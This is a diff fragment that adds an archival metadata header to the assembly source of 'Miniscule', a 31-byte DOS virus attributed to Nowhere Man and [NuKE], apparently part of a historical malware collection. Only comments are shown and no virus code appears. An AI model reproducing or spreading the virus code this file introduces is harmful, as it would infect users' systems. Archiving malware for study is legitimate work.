@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; Miniscule:  the world's smallest generic virus (only 31 bytes long!)
 ; (C) 1992 Nowhere Man and [NuKE] WaReZ
 ; Written on January 22, 1991
